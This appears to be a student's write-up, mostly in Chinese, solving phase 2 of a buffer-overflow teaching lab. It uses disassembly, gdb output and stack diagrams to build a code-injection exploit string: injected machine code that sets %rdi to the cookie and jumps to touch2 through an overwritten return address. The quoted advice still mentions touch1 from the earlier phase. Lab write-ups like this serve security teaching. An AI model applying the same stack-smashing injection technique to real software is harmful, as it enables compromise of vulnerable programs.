----------------------------------------------------------------------------
ct2:
----------------------------------------------------------------------------
Phase 2 involves injecting a small amount of code as part of your exploit string.
Within the file ctarget there is code for a function touch2 having the following C representation:

1 void touch2(unsigned val)
6
2 {
3 vlevel = 2; /* Part of validation protocol */
4 if (val == cookie) {
5 printf("Touch2!: You called touch2(0x%.8x)\n", val);
6 validate(2);
7 } else {
8 printf("Misfire: You called touch2(0x%.8x)\n", val);
9 fail(2);
10 }
11 exit(0);
12 }

Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case,
however, you must make it appear to touch2 as if you have passed your cookie as its argument.

Some Advice:
• All the information you need to devise your exploit string for this level can be determined by examining a disassembled version of CTARGET. Use objdump -d to get this dissembled version.
• The idea is to position a byte representation of the starting address for touch1 so that the ret
instruction at the end of the code for getbuf will transfer control to touch1.
• Be careful about byte ordering.
• You might want to use GDB to step the program through the last few instructions of getbuf to make
sure it is doing the right thing.
• The placement of buf within the stack frame for getbuf depends on the value of compile-time
constant BUFFER_SIZE, as well the allocation strategy used by GCC. You will need to examine the
disassembled code to determine its position.

touch2中的val需要和cookie相等
建议中提到用rdi传递val
只用ret不能用jmp或call
touch2逻辑就是比较传入参数与cookie是否相等

通过插入字符串，使getbuf函数返回后执行touch2函数，并将cookie值作为参数传递。与第1题相比，本题需要额外传入一个参数，即将cookie值放入%rdi寄存器中。因此，我们需要在栈上放置一条mov指令来实现这一操作。
整体思路是：要想让输入的指令生效，需要将 getbuf 的返回地址修改为 buf 的起始地址，这样执行 ret 之后会将 M[%rsp] 送到 %rip 中，下次就不会从 Text 区取指令了，而是从 stack 里面取指令（此处就是缓冲区）

 test()函数 -> call指令 -> 栈顶放入返回地址 -> 调用getbuf()函数 - > 开辟空间 -> call指令调用Gets()函数读入数据(此时覆盖了之前放入的返回地址)并且ret返回 -> 释放空间 -> ret指令在栈顶读入 0x5561dc78 到 rip寄存器里 -> 执行地址0x5561dc78里面的指令(机器码组)48 c7 c7 fa 97 b9 59 (mov $0x59b997fa,%rdi , 将cookie值放入rdi里面) c3 (ret , 返回, ret指令在栈顶读入 touch2()函数的地址4017ec 到 rip寄存器里) -> 成功调用touch2()函数

+-------------------------+
| test() 的返回地址       |  <- rsp
+-------------------------+

+-------------------------+
| getbuf() 的返回地址     |  <- rsp
+-------------------------+
| test() 的返回地址       |  <- rsp + 8
+-------------------------+

+-------------------------+
| 未初始化的 40 字节空间  |  <- rsp 到 rsp + 39
+-------------------------+
| getbuf() 的返回地址     |  <- rsp + 40
+-------------------------+
| test() 的返回地址       |  <- rsp + 48
+-------------------------+

+-------------------------+
| 48 c7 c7 fa 97 b9 59 c3 |  <- rsp (机器码指令)
+-------------------------+
| 00 00 00 00 00 00 00 00 |  <- rsp + 8 (填充数据)
+-------------------------+
| 00 00 00 00 00 00 00 00 |  <- rsp + 16 (填充数据)
+-------------------------+
| 00 00 00 00 00 00 00 00 |  <- rsp + 24 (填充数据)
+-------------------------+
| 00 00 00 00 00 00 00 00 |  <- rsp + 32 (填充数据)
+-------------------------+
| 78 dc 61 55 00 00 00 00 |  <- rsp + 40 (覆盖的返回地址)
+-------------------------+
| ec 17 40 00 00 00 00 00 |  <- rsp + 48 (touch2() 的地址)
+-------------------------+

----------------------------------------------------------------------------
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret
End of assembler dump.
----------------------------------------------------------------------------
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:     sub    $0x8,%rsp
   0x00000000004017f0 <+4>:     mov    %edi,%edx
   0x00000000004017f2 <+6>:     movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:    cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:    jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:    mov    $0x4030e8,%esi
   0x0000000000401809 <+29>:    mov    $0x1,%edi
   0x000000000040180e <+34>:    mov    $0x0,%eax
   0x0000000000401813 <+39>:    call   0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:    mov    $0x2,%edi
   0x000000000040181d <+49>:    call   0x401c8d <validate>
   0x0000000000401822 <+54>:    jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:    mov    $0x403110,%esi
   0x0000000000401829 <+61>:    mov    $0x1,%edi
   0x000000000040182e <+66>:    mov    $0x0,%eax
   0x0000000000401833 <+71>:    call   0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:    mov    $0x2,%edi
   0x000000000040183d <+81>:    call   0x401d4f <fail>
   0x0000000000401842 <+86>:    mov    $0x0,%edi
   0x0000000000401847 <+91>:    call   0x400e40 <exit@plt>
End of assembler dump.
地址:0x00000000004017ec
由ct1执行结果知道：
Cookie : 0x59b997fa
(gdb) p $rsp
$1 = (void *) 0x5561dc78
----------------------------------------------------------------------------
接下来注入代码：
为了实现 %rdi 的修改和 touch2 的跳转，可以使用如下的汇编代码实现，ret 指令可以将 M[%rsp] 的值（此处为 touch2 的地址 0x4017ec）送到 %rip，使得程序回到 Text 区的 touch2 函数处执行

mov $0x59b997fa, %edi
ret

得到：
bf fa 97 b9 59 /* mov $0x59b997fa, %edi */
c3             /* ret */
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 /* buf 的起始地址 */
ec 17 40 00 /* touch2 的起始地址 */

发现这里虽然成功设置了 %rdi 的值为 cookie，也跳转到了 touch2，最终却由于 segment fault 而失败。出现这个错误的原因，是因为我们修改了 12 个字节的栈帧的内容：第一次将 8 个字节的返回地址修改为 buf 起始地址，第二次应该是修改了 launch （调用了 test）栈帧中保存的返回地址

于是修改为入栈弹出，保证栈帧内容:
movq $0x59b997fa,%rdi #将cookie值赋给rdi
pushq $0x4017ec #将touch2地址压栈,随后执行该地址下的touch2函数  
ret #将栈顶值弹出作为返回地址
接下来查看机器码，方法就是把以上代码放入文本里通过objdump查看
vim attack2.s
.s是编写的汇编源代码,gcc可以直接处理.s文件并将其编译成目标文件或可执行文件.o文件
gcc -c attack2.s
objdump -d attack2.o > attack2.txt
将.o文件反汇编
最终得到机器码:

attack2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          push   $0x4017ec
   c:   c3                      ret
已经是小端序了
则有
bf fa 97 b9 59 /* mov $0x59b997fa, %edi */
68 ec 17 40 00 /* pushq $0x4017ec */
c3             /* ret */
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 /* buf 的起始地址 ,getbuf的返回地址*/
----------------------------------------------------------------------------
ct2.txt:
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
----------------------------------------------------------------------------
指令之间可以没有间隔，比如上图第一条指令和第二条指令在存储器上是连续的
----------------------------------------------------------------------------
